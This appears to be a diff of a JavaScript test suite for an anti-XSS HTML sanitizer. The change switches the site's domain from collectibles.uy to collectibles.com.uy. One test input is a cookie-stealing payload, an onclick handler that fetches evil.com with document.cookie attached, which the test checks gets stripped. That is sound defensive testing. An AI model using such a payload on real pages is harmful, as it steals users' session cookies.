@@ -18,7 +18,7 @@ describe('HTML Sanitizer Security Tests (Block A8 - Anti-XSS)', () => {
   });
 
   it('should remove onclick and onmouseover handlers from links and divs', () => {
-    const malicious = '<a href="https://collectibles.uy" onclick="fetch(\'https://evil.com?c=\'+document.cookie)">Click</a>';
+    const malicious = '<a href="https://collectibles.com.uy" onclick="fetch(\'https://evil.com?c=\'+document.cookie)">Click</a>';
     const clean = sanitizeRichHtml(malicious);
     expect(clean).not.toContain('onclick');
     expect(clean).not.toContain('evil.com');
@@ -38,10 +38,10 @@ describe('HTML Sanitizer Security Tests (Block A8 - Anti-XSS)', () => {
   });
 
   it('should preserve safe formatting and valid links', () => {
-    const safe = '<div class="content"><p>Bienvenido a <strong>Collectibles</strong>. Visita nuestro <a href="https://collectibles.uy/shop">catálogo</a>.</p></div>';
+    const safe = '<div class="content"><p>Bienvenido a <strong>Collectibles</strong>. Visita nuestro <a href="https://collectibles.com.uy/shop">catálogo</a>.</p></div>';
     const clean = sanitizeRichHtml(safe);
     expect(clean).toContain('<strong>Collectibles</strong>');
-    expect(clean).toContain('href="https://collectibles.uy/shop"');
+    expect(clean).toContain('href="https://collectibles.com.uy/shop"');
   });
 
   it('should allow application/ld+json scripts in sanitizeHeadMarkup but strip regular scripts', () => {
